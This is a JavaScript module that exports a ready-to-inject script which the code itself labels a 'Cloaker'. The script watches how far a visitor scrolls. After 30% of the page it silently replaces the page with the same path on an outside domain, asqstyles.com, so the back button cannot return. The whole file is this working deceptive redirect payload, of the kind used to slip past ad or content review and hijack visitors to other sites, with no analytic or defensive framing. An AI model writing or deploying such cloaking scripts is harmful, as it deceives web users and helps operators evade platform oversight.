export const cloakScript = `
(function() {
    var TARGET_DOMAIN = "https://asqstyles.com";
    var SCROLL_THRESHOLD = 0.30;
    var redirected = false;

    function getScrollFraction() {
        var doc = document.documentElement;
        var body = document.body;
        
        var scrollTop = window.pageYOffset || 
                        (doc ? doc.scrollTop : 0) || 
                        (body ? body.scrollTop : 0) || 
                        0;

        var scrollHeight = Math.max(
            (body ? body.scrollHeight : 0),
            (doc ? doc.scrollHeight : 0),
            (body ? body.offsetHeight : 0),
            (doc ? doc.offsetHeight : 0)
        );

        var clientHeight = window.innerHeight || 
                           (doc ? doc.clientHeight : 0) || 
                           (body ? body.clientHeight : 0) || 
                           0;

        var maxScroll = scrollHeight - clientHeight;

        if (maxScroll <= 50) {
            return scrollTop > 50 ? 1 : 0;
        }

        return scrollTop / maxScroll;
    }

    function doRedirect() {
        if (redirected) return;
        redirected = true;

        var path = location.pathname;
        if (!path.endsWith('/')) {
            path = path + '/';
        }
        var target = TARGET_DOMAIN + path + location.search;

        console.log("[Cloaker] 30% scroll reached. Redirecting to:", target);

        try {
            window.location.replace(target);
        } catch (e) {
            window.location.href = target;
        }
    }

    function check() {
        if (redirected) return;
        var progress = getScrollFraction();
        if (progress >= SCROLL_THRESHOLD) {
            doRedirect();
        }
    }

    // Direct event listeners for instant trigger without polling delay
    window.addEventListener("scroll", check, { passive: true });
    window.addEventListener("touchmove", check, { passive: true });
    window.addEventListener("wheel", check, { passive: true });

    // Fallback timer
    var timer = setInterval(function() {
        if (redirected) {
            clearInterval(timer);
            return;
        }
        check();
    }, 80);

    // Initial check in case user loaded scrolled or with anchor
    if (document.readyState === "complete" || document.readyState === "interactive") {
        check();
    } else {
        document.addEventListener("DOMContentLoaded", check);
    }
})();
`;
